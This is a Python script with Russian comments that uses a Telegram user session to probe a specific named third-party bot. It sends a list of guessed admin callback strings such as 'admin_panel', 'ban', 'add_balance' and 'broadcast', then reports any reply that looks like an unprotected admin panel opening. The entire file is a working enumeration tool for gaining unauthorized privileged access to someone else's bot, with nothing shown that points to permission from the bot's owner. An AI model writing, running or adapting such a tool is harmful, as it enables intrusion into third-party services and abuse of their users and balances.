"""
probe_bot.py — проверяет незащищённые admin callback в боте.
Запуск: python3 probe_bot.py
"""
import asyncio
import sys
import os

TARGET_BOT = "@kpixabot"

CALLBACKS = [
    "admin", "admin_panel", "panel", "admin_menu",
    "admin_main", "settings", "admin_settings",
    "manage", "admin_manage", "control", "dashboard",
    "users", "admin_users", "stats", "admin_stats",
    "broadcast", "admin_broadcast", "mailing",
    "ban", "unban", "give", "add_balance",
    "admin_give", "admin_ban", "promo", "admin_promo",
]

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


async def probe(session_path: str, api_id: int, api_hash: str):
    from telethon import TelegramClient
    from telethon.tl.functions.messages import GetBotCallbackAnswerRequest
    from telethon.errors import BotResponseTimeoutError

    client = TelegramClient(session_path, api_id, api_hash,
                            system_version="4.16.30-vxCUSTOM")
    await client.connect()
    if not await client.is_user_authorized():
        print("❌ Сессия не авторизована")
        await client.disconnect()
        return

    me = await client.get_me()
    print(f"✅ Вошёл как @{me.username} ({me.id})")

    # Отправляем /start чтобы получить message_id
    print(f"\n📨 Отправляю /start в {TARGET_BOT}...")
    msg = await client.send_message(TARGET_BOT, "/start")
    await asyncio.sleep(1.5)

    # Берём последнее сообщение от бота
    msgs = await client.get_messages(TARGET_BOT, limit=5)
    bot_msg = None
    for m in msgs:
        if m.buttons:
            bot_msg = m
            break

    if not bot_msg:
        print("⚠️  Нет сообщений с кнопками, пробую без message_id")
        bot_msg = msgs[0] if msgs else None

    if not bot_msg:
        print("❌ Нет сообщений от бота")
        await client.disconnect()
        return

    print(f"📋 Используем message_id={bot_msg.id}\n")
    print("🔍 Перебираю callbacks...\n")

    entity = await client.get_entity(TARGET_BOT)

    for cb in CALLBACKS:
        try:
            result = await client(GetBotCallbackAnswerRequest(
                peer=entity,
                msg_id=bot_msg.id,
                data=cb.encode()
            ))
            answer = result.message or ""
            if answer:
                print(f"  ✅ [{cb}] → {answer[:100]}")
            else:
                # Проверяем изменилось ли сообщение
                new_msgs = await client.get_messages(TARGET_BOT, limit=1)
                if new_msgs and new_msgs[0].id != bot_msg.id:
                    print(f"  🔥 [{cb}] → НОВОЕ СООБЩЕНИЕ! (возможно открылась панель)")
                    bot_msg = new_msgs[0]
                else:
                    print(f"  · [{cb}] нет ответа")
        except BotResponseTimeoutError:
            print(f"  · [{cb}] таймаут")
        except Exception as e:
            err = str(e)
            if "MESSAGE_ID_INVALID" in err:
                print(f"  · [{cb}] invalid msg_id")
            elif "BOT_RESPONSE_TIMEOUT" in err:
                print(f"  · [{cb}] таймаут")
            else:
                print(f"  · [{cb}] {err[:60]}")
        await asyncio.sleep(0.4)

    print("\n✅ Готово")
    await client.disconnect()


def main():
    import config as cfg
    api_id   = int(cfg.AUREPORT_API_ID)
    api_hash = cfg.AUREPORT_API_HASH

    session = input("📁 Путь к .session файлу (без .session): ").strip()
    if not session:
        print("❌ Пустой путь")
        sys.exit(1)

    asyncio.run(probe(session, api_id, api_hash))


if __name__ == "__main__":
    main()
